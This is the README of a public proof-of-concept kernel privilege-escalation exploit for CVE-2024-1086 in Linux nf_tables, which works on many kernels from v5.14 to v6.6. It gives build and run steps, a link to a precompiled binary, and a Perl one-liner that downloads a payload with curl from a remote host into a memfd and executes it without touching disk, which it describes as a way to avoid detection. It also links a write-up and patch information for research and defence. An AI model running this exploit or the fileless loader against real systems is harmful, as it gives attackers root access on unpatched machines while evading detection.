# CVE-2024-1086

Fileless proof-of-concept exploit for CVE-2024-1086, working on most Linux kernels between (including) v5.14 and (including) v6.6, including (but not limited to) Debian, Ubuntu, and KernelCTF. The success rate is typically around 99,4% (n=1000) to 93% (n=1000). 

---

The only requirements are that user namespaces are enabled (kconfig `CONFIG_USER_NS=y`), those user namespaces are unprivileged (sh command `sysctl kernel.unprivileged_userns_clone` = 1), and nf_tables is enabled (kconfig `CONFIG_NF_TABLES=y`). By default, these are all enabled on Debian, Ubuntu, and KernelCTF. Other distro's have not been tested, but may work as well.

**Note (details in blogpost):**
- the affected versions lower limit (v5.14) is caused by the exploit. The underlying vulnerability has been in the kernel since v3.15, so if you're below v5.14 make sure you update your kernel in case someone makes an N-day for your specific version.
- the exploit may be unstable on systems with a WiFi adapter, surrounded by high-usage WiFi networks. When testing, please turn off WiFi adapters through BIOS.
- the exploit does not work v6.4> kernels with kconfig `CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y` (including Ubuntu v6.5)

## using the exploit

### configuring the exploit

In [`src/config.h`](/src/config.h) are several configuration values which may need to be tweaked.

The default values should work out of the box on tested distros (Debian, Ubuntu, and KernelCTF). On non-tested setups/distros, please make sure the kconfig values match with the target kernel.

Note that if you are running the exploit over SSH (into the test machine) or a reverse shell, you may want to toggle `CONFIG_REDIRECT_LOG` to `1` to avoid unnecessary network activity.

### building the exploit

Building the exploit is incredibly easy (outfile: `CVE-2024-1086/exploit`):

```bash
git clone https://github.com/Notselwyn/CVE-2024-1086
cd CVE-2024-1086
make
```

Please note that you may need to install certain tools like musl-gcc. Because of the different distros you may want to compile this exploit on, I will not provide instructions on how to install those.

If this is impractical for you, there is an [compiled x64 binary](https://github.com/Notselwyn/CVE-2024-1086/releases/download/v1.0.0/exploit) with the default config.

### running the exploit

Running the exploit is just as trivial:

```bash
./exploit
```

Note that fileless execution is also supported, in case of pentest situations where detections need to be avoided.

Perl needs to be installed on the target:
```bash
perl -e '
  require qw/syscall.ph/;

  my $fd = syscall(SYS_memfd_create(), $fn, 0);
  open(my $fh, ">&=".$fd);
  print $fh `curl https://example.com/exploit -s`;
  exec {"/proc/$$/fd/$fd"} "memfd";
'
```

## blogpost / write-up

A full write-up of the exploit can be found in the blogpost: ["Flipping Pages: An analysis of a new Linux vulnerability in nf_tables and hardened exploitation techniques"](https://pwning.tech/nftables/) @ pwning.tech

## patch

For the fix/mitigation, check the [CVE-2024-1086 description](https://nvd.nist.gov/vuln/detail/CVE-2024-1086).

## disclaimer

The programs and scripts ("programs") in this software directory/folder/repository ("repository") are published, developed and distributed for educational/research purposes only. I ("the creator") do not condone any malicious or illegal usage of the programs in this repository, as the intend is sharing research and not doing illegal activities with it. I am not legally responsible for anything you do with the programs in this repository.
